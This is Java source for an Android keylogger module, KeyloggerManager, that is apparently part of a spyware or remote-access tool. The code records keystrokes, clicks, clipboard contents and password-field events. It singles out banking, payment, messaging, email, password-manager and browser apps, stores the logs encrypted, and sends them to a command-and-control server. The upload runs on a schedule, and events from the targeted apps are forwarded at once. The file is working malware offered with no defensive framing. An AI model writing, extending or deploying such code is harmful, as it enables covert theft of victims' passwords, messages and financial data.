package com.tarjon.admin.utils;

import android.content.Context;
import android.content.SharedPreferences;
import android.util.Log;

import com.tarjon.admin.network.C2Connection;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

/**
 * Manages keylogging functionality for the application
 * Captures and stores keystrokes, clipboard changes, etc.
 */
public class KeyloggerManager {
    private static final String TAG = "KeyloggerManager";
    
    private final Context context;
    private final C2Connection c2Connection;
    private final ExecutorService executor;
    private final ScheduledExecutorService scheduledExecutor;
    
    // Keylogging settings
    private final String LOG_DIRECTORY = "keylogs";
    private final String SETTINGS_FILE = "keylogger_settings";
    private final String CURRENT_LOG_KEY = "current_log";
    private final String ENCRYPTION_KEY = "tarjon_keylogger_encryption_key";
    private final String ENCRYPTION_IV = "tarjon_iv_123456";
    
    // Interval for syncing logs to server (minutes)
    private static final int SYNC_INTERVAL = 30;
    
    // Track active apps for better context
    private final Map<String, String> activeApps = new HashMap<>();
    
    // Sensitive apps that require additional monitoring
    private final List<String> sensitiveApps = new ArrayList<>();
    
    // Keylogging status
    private boolean isKeyloggingEnabled = true;
    private boolean isClipboardMonitoringEnabled = true;
    private boolean isPasswordLoggingEnabled = false; // Disabled by default for security
    
    // Current log file
    private String currentLogFile;
    
    public KeyloggerManager(Context context, C2Connection c2Connection) {
        this.context = context;
        this.c2Connection = c2Connection;
        this.executor = Executors.newSingleThreadExecutor();
        this.scheduledExecutor = Executors.newScheduledThreadPool(1);
        
        // Set up sensitive apps list
        setupSensitiveApps();
        
        // Initialize log directory
        initializeLogDirectory();
        
        // Initialize log file
        createNewLogFile();
        
        // Schedule regular sync to server
        scheduledExecutor.scheduleAtFixedRate(
                this::syncLogsToServer,
                SYNC_INTERVAL,
                SYNC_INTERVAL,
                TimeUnit.MINUTES
        );
    }
    
    /**
     * Set up list of sensitive apps that require additional monitoring
     */
    private void setupSensitiveApps() {
        // Banking apps
        sensitiveApps.add("com.paypal.android.p2pmobile");
        sensitiveApps.add("com.venmo");
        sensitiveApps.add("com.squareup.cash");
        
        // Social media and messaging
        sensitiveApps.add("com.whatsapp");
        sensitiveApps.add("com.facebook.katana");
        sensitiveApps.add("com.facebook.orca");
        sensitiveApps.add("com.instagram.android");
        sensitiveApps.add("com.twitter.android");
        sensitiveApps.add("com.snapchat.android");
        sensitiveApps.add("com.viber.voip");
        sensitiveApps.add("com.skype.raider");
        sensitiveApps.add("org.telegram.messenger");
        sensitiveApps.add("kik.android");
        
        // Email
        sensitiveApps.add("com.google.android.gm");
        sensitiveApps.add("com.microsoft.office.outlook");
        sensitiveApps.add("com.yahoo.mobile.client.android.mail");
        
        // Password managers
        sensitiveApps.add("com.lastpass.lpandroid");
        sensitiveApps.add("com.dashlane");
        sensitiveApps.add("com.agilebits.onepassword");
        sensitiveApps.add("com.bitwarden");
        
        // Shopping and payment
        sensitiveApps.add("com.amazon.mShop.android.shopping");
        sensitiveApps.add("com.ebay.mobile");
        sensitiveApps.add("com.google.android.apps.walletnfcrel");
        
        // Browsers
        sensitiveApps.add("com.android.chrome");
        sensitiveApps.add("org.mozilla.firefox");
        sensitiveApps.add("com.opera.browser");
        sensitiveApps.add("com.brave.browser");
    }
    
    /**
     * Initialize log directory
     */
    private void initializeLogDirectory() {
        File logDir = new File(context.getFilesDir(), LOG_DIRECTORY);
        if (!logDir.exists()) {
            logDir.mkdirs();
        }
    }
    
    /**
     * Create a new log file
     */
    private void createNewLogFile() {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US);
        String timestamp = sdf.format(new Date());
        
        currentLogFile = LOG_DIRECTORY + File.separator + "keylog_" + timestamp + ".json";
        
        // Store current log file in preferences
        SharedPreferences prefs = context.getSharedPreferences(SETTINGS_FILE, Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = prefs.edit();
        editor.putString(CURRENT_LOG_KEY, currentLogFile);
        editor.apply();
        
        // Initialize log file with header
        JSONObject logHeader = new JSONObject();
        try {
            logHeader.put("created", System.currentTimeMillis());
            logHeader.put("device", Build.MANUFACTURER + " " + Build.MODEL);
            logHeader.put("type", "keylog");
            logHeader.put("entries", new JSONArray());
            
            writeToLogFile(logHeader.toString());
        } catch (JSONException e) {
            Log.e(TAG, "Error creating log header: " + e.getMessage());
        }
    }
    
    /**
     * Log a text change event (keystroke)
     * @param packageName Package name of the app where text changed
     * @param text Text that was entered
     */
    public void logTextChange(String packageName, String text) {
        if (!isKeyloggingEnabled) {
            return;
        }
        
        // Skip logging if the app is not in our list of sensitive apps and is not the current focus
        if (!sensitiveApps.contains(packageName) && !activeApps.containsKey(packageName)) {
            return;
        }
        
        // Add log entry
        executor.execute(() -> {
            try {
                // Create log entry
                JSONObject logEntry = new JSONObject();
                logEntry.put("type", "text_change");
                logEntry.put("timestamp", System.currentTimeMillis());
                logEntry.put("packageName", packageName);
                logEntry.put("text", text);
                
                // Add entry to log file
                addLogEntry(logEntry);
                
                // If this is a sensitive app, notify immediately
                if (sensitiveApps.contains(packageName)) {
                    c2Connection.sendCommandResult("keylog_entry", 
                            "Keystroke in sensitive app: " + getAppNameFromPackage(packageName),
                            logEntry.toString());
                }
            } catch (JSONException e) {
                Log.e(TAG, "Error creating log entry: " + e.getMessage());
            }
        });
    }
    
    /**
     * Log a click event
     * @param packageName Package name of the app where click occurred
     * @param clickData JSON string with click data
     */
    public void logClickEvent(String packageName, String clickData) {
        if (!isKeyloggingEnabled) {
            return;
        }
        
        // Add log entry
        executor.execute(() -> {
            try {
                // Create log entry
                JSONObject logEntry = new JSONObject();
                logEntry.put("type", "click");
                logEntry.put("timestamp", System.currentTimeMillis());
                logEntry.put("packageName", packageName);
                
                // Parse click data if it's a valid JSON
                try {
                    logEntry.put("data", new JSONObject(clickData));
                } catch (JSONException e) {
                    logEntry.put("data", clickData);
                }
                
                // Add entry to log file
                addLogEntry(logEntry);
            } catch (JSONException e) {
                Log.e(TAG, "Error creating log entry: " + e.getMessage());
            }
        });
    }
    
    /**
     * Log a clipboard change
     * @param packageName Package name of the app where clipboard changed
     * @param clipboardData JSON string with clipboard data
     */
    public void logClipboardChange(String packageName, String clipboardData) {
        if (!isKeyloggingEnabled || !isClipboardMonitoringEnabled) {
            return;
        }
        
        // Add log entry
        executor.execute(() -> {
            try {
                // Create log entry
                JSONObject logEntry = new JSONObject();
                logEntry.put("type", "clipboard");
                logEntry.put("timestamp", System.currentTimeMillis());
                logEntry.put("packageName", packageName);
                
                // Parse clipboard data if it's a valid JSON
                try {
                    logEntry.put("data", new JSONObject(clipboardData));
                } catch (JSONException e) {
                    logEntry.put("data", clipboardData);
                }
                
                // Add entry to log file
                addLogEntry(logEntry);
                
                // Always notify about clipboard changes
                c2Connection.sendCommandResult("keylog_clipboard", 
                        "Clipboard changed in app: " + getAppNameFromPackage(packageName),
                        logEntry.toString());
            } catch (JSONException e) {
                Log.e(TAG, "Error creating log entry: " + e.getMessage());
            }
        });
    }
    
    /**
     * Log a password field focus event
     * @param packageName Package name of the app where password field is focused
     * @param focusData JSON string with focus data
     */
    public void logPasswordFieldFocus(String packageName, String focusData) {
        if (!isKeyloggingEnabled) {
            return;
        }
        
        // Add log entry
        executor.execute(() -> {
            try {
                // Create log entry
                JSONObject logEntry = new JSONObject();
                logEntry.put("type", "password_focus");
                logEntry.put("timestamp", System.currentTimeMillis());
                logEntry.put("packageName", packageName);
                
                // Parse focus data if it's a valid JSON
                try {
                    logEntry.put("data", new JSONObject(focusData));
                } catch (JSONException e) {
                    logEntry.put("data", focusData);
                }
                
                // Add entry to log file
                addLogEntry(logEntry);
                
                // Notify about password field focus in any app
                c2Connection.sendCommandResult("keylog_password_focus", 
                        "Password field focused in app: " + getAppNameFromPackage(packageName),
                        logEntry.toString());
                
                // If password logging is enabled, update active apps list
                if (isPasswordLoggingEnabled) {
                    activeApps.put(packageName, "password_focus");
                }
            } catch (JSONException e) {
                Log.e(TAG, "Error creating log entry: " + e.getMessage());
            }
        });
    }
    
    /**
     * Log general user activity in an app
     * @param packageName Package name of the app
     * @param activityType Type of activity (e.g., "scroll", "swipe")
     */
    public void logUserActivity(String packageName, String activityType) {
        if (!isKeyloggingEnabled) {
            return;
        }
        
        // Add log entry
        executor.execute(() -> {
            try {
                // Create log entry
                JSONObject logEntry = new JSONObject();
                logEntry.put("type", "activity");
                logEntry.put("timestamp", System.currentTimeMillis());
                logEntry.put("packageName", packageName);
                logEntry.put("activityType", activityType);
                
                // Add entry to log file
                addLogEntry(logEntry);
            } catch (JSONException e) {
                Log.e(TAG, "Error creating log entry: " + e.getMessage());
            }
        });
    }
    
    /**
     * Add entry to the current log file
     * @param logEntry JSON object to add to log
     */
    private void addLogEntry(JSONObject logEntry) {
        executor.execute(() -> {
            try {
                // Read current log file
                File logFile = new File(context.getFilesDir(), currentLogFile);
                
                if (!logFile.exists()) {
                    // If log file doesn't exist, create a new one
                    createNewLogFile();
                    logFile = new File(context.getFilesDir(), currentLogFile);
                }
                
                // Read log file contents
                String fileContents = FileSystemManager.readFileToString(logFile);
                JSONObject logJson = new JSONObject(fileContents);
                
                // Get entries array
                JSONArray entries = logJson.getJSONArray("entries");
                
                // Add new entry
                entries.put(logEntry);
                
                // Update log file
                logJson.put("entries", entries);
                logJson.put("lastUpdated", System.currentTimeMillis());
                
                // Write updated log back to file
                writeToLogFile(logJson.toString());
                
                // Check if log file size exceeds limit and create new file if needed
                if (logFile.length() > 1024 * 1024) { // 1MB limit
                    createNewLogFile();
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Error adding log entry: " + e.getMessage());
            }
        });
    }
    
    /**
     * Write data to the log file (encrypting it)
     * @param data Data to write to log file
     */
    private void writeToLogFile(String data) {
        try {
            // Encrypt data
            String encryptedData = encrypt(data);
            
            // Write to file
            File logFile = new File(context.getFilesDir(), currentLogFile);
            FileWriter writer = new FileWriter(logFile);
            writer.write(encryptedData);
            writer.close();
        } catch (IOException e) {
            Log.e(TAG, "Error writing to log file: " + e.getMessage());
        }
    }
    
    /**
     * Encrypt data using AES
     * @param data Data to encrypt
     * @return Encrypted data as Base64 string
     */
    private String encrypt(String data) {
        try {
            byte[] keyBytes = ENCRYPTION_KEY.getBytes(StandardCharsets.UTF_8);
            MessageDigest sha = MessageDigest.getInstance("SHA-256");
            keyBytes = sha.digest(keyBytes);
            
            SecretKeySpec secretKey = new SecretKeySpec(keyBytes, "AES");
            IvParameterSpec ivSpec = new IvParameterSpec(ENCRYPTION_IV.getBytes(StandardCharsets.UTF_8));
            
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.ENCRYPT_MODE, secretKey, ivSpec);
            
            byte[] encrypted = cipher.doFinal(data.getBytes(StandardCharsets.UTF_8));
            return android.util.Base64.encodeToString(encrypted, android.util.Base64.DEFAULT);
        } catch (Exception e) {
            Log.e(TAG, "Error encrypting data: " + e.getMessage());
            return data; // Fall back to unencrypted data
        }
    }
    
    /**
     * Decrypt data using AES
     * @param encryptedData Encrypted data as Base64 string
     * @return Decrypted data
     */
    private String decrypt(String encryptedData) {
        try {
            byte[] keyBytes = ENCRYPTION_KEY.getBytes(StandardCharsets.UTF_8);
            MessageDigest sha = MessageDigest.getInstance("SHA-256");
            keyBytes = sha.digest(keyBytes);
            
            SecretKeySpec secretKey = new SecretKeySpec(keyBytes, "AES");
            IvParameterSpec ivSpec = new IvParameterSpec(ENCRYPTION_IV.getBytes(StandardCharsets.UTF_8));
            
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, secretKey, ivSpec);
            
            byte[] original = cipher.doFinal(android.util.Base64.decode(encryptedData, android.util.Base64.DEFAULT));
            return new String(original, StandardCharsets.UTF_8);
        } catch (Exception e) {
            Log.e(TAG, "Error decrypting data: " + e.getMessage());
            return encryptedData; // Return encrypted data if decryption fails
        }
    }
    
    /**
     * Sync logs to the C2 server
     */
    private void syncLogsToServer() {
        executor.execute(() -> {
            try {
                // Get log directory
                File logDir = new File(context.getFilesDir(), LOG_DIRECTORY);
                File[] logFiles = logDir.listFiles();
                
                if (logFiles == null || logFiles.length == 0) {
                    return;
                }
                
                // Get current log file
                SharedPreferences prefs = context.getSharedPreferences(SETTINGS_FILE, Context.MODE_PRIVATE);
                String currentLog = prefs.getString(CURRENT_LOG_KEY, "");
                
                // Process each log file
                for (File logFile : logFiles) {
                    // Skip current log file
                    if (logFile.getAbsolutePath().contains(currentLog)) {
                        continue;
                    }
                    
                    // Read and decrypt log file
                    String encryptedContents = FileSystemManager.readFileToString(logFile);
                    String decryptedContents = decrypt(encryptedContents);
                    
                    // Parse log file
                    JSONObject logJson = new JSONObject(decryptedContents);
                    
                    // Send log to server
                    c2Connection.sendCommandResult("keylog_sync", 
                            "Syncing keylog file: " + logFile.getName(),
                            logJson.toString());
                    
                    // Delete log file after successful sync
                    logFile.delete();
                }
            } catch (Exception e) {
                Log.e(TAG, "Error syncing logs to server: " + e.getMessage());
            }
        });
    }
    
    /**
     * Force sync all logs to server immediately
     */
    public void forceSyncLogs() {
        syncLogsToServer();
    }
    
    /**
     * Enable or disable keylogging
     * @param enabled Whether keylogging should be enabled
     */
    public void setKeyloggingEnabled(boolean enabled) {
        isKeyloggingEnabled = enabled;
    }
    
    /**
     * Enable or disable clipboard monitoring
     * @param enabled Whether clipboard monitoring should be enabled
     */
    public void setClipboardMonitoringEnabled(boolean enabled) {
        isClipboardMonitoringEnabled = enabled;
    }
    
    /**
     * Enable or disable password logging
     * @param enabled Whether password logging should be enabled
     */
    public void setPasswordLoggingEnabled(boolean enabled) {
        isPasswordLoggingEnabled = enabled;
    }
    
    /**
     * Add a package to the sensitive apps list
     * @param packageName Package name to add
     */
    public void addSensitiveApp(String packageName) {
        if (!sensitiveApps.contains(packageName)) {
            sensitiveApps.add(packageName);
        }
    }
    
    /**
     * Remove a package from the sensitive apps list
     * @param packageName Package name to remove
     */
    public void removeSensitiveApp(String packageName) {
        sensitiveApps.remove(packageName);
    }
    
    /**
     * Update the active apps list
     * @param packageName Package name of the active app
     * @param activityName Activity name (optional)
     */
    public void updateActiveApp(String packageName, String activityName) {
        activeApps.put(packageName, activityName != null ? activityName : "");
        
        // Remove old entries if there are too many
        if (activeApps.size() > 10) {
            // Get the first entry
            String firstKey = activeApps.keySet().iterator().next();
            activeApps.remove(firstKey);
        }
    }
    
    /**
     * Get app name from package name
     */
    private String getAppNameFromPackage(String packageName) {
        try {
            PackageManager pm = context.getPackageManager();
            ApplicationInfo ai = pm.getApplicationInfo(packageName, 0);
            return pm.getApplicationLabel(ai).toString();
        } catch (PackageManager.NameNotFoundException e) {
            return packageName;
        }
    }
    
    /**
     * Read a file to a string
     */
    private static class FileSystemManager {
        /**
         * Read file contents to string
         */
        public static String readFileToString(File file) throws IOException {
            byte[] buffer = new byte[(int) file.length()];
            
            try (java.io.FileInputStream fis = new java.io.FileInputStream(file)) {
                fis.read(buffer);
            }
            
            return new String(buffer, StandardCharsets.UTF_8);
        }
    }
    
    /**
     * Clean up resources
     */
    public void release() {
        // Force sync logs before shutting down
        forceSyncLogs();
        
        if (scheduledExecutor != null && !scheduledExecutor.isShutdown()) {
            scheduledExecutor.shutdownNow();
        }
        
        if (executor != null && !executor.isShutdown()) {
            executor.shutdownNow();
        }
    }
}